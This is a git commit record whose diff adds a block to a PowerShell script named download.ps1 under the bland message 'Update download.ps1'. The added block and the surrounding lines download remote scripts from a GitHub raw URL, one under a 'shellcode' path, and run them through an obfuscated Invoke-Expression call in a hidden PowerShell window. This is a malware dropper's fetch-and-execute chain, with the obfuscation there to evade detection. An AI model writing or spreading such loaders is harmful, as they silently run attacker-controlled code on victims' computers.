e5d9c327a75aea6ddfcfeb7fff29224dff95372c
43a1723 <hai1723notgay@gmail.com>
2025-02-06 20:09:26 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -92,6 +92,10 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Me
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/ayuly.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
